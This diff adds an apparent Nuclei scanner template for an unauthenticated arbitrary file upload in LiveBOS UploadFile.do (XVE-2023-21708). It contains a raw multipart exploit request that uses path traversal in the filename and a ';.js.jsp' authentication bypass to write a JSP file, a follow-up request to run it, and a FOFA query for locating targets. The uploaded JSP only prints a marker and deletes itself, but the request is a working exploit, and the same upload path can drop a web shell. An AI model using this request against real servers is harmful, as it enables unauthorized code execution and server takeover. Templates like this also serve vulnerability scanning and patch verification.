@@ -1,0 +1,31 @@
+http:
+    - raw:
+        - "POST /feed/UploadFile.do;.js.jsp HTTP/1.1 \nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi\n\n------WebKitFormBoundaryxegqoxxi\nContent-Disposition: form-data; name=\"file\"; filename=\"/../../../../{{username}}.jsp\"\nContent-Type: image/jpeg\n\n<%@ page import=\"java.io.File\" %>\n<%\n  out.println(\"pboyjnnrfipmplsukdeczudsefxmywe\");\n  String filePath = application.getRealPath(request.getServletPath());\n  new File(filePath).delete();\n%>\n------WebKitFormBoundaryxegqoxxi--\n"
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{username}}.jsp;.js.jsp HTTP/1.1
+          Host: {{Hostname}}
+id: LiveBOS-UploadFile-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Power by LiveBOS"
+        LiveBOS UploadFile.do 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: LiveBOS UploadFile.do 任意文件上传漏洞(XVE-2023-21708)
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140926931
+    severity: high
+    tags:
+        - LiveBOS
+        - Servlet
+variables:
+    username: '{{to_lower(rand_base(6))}}'
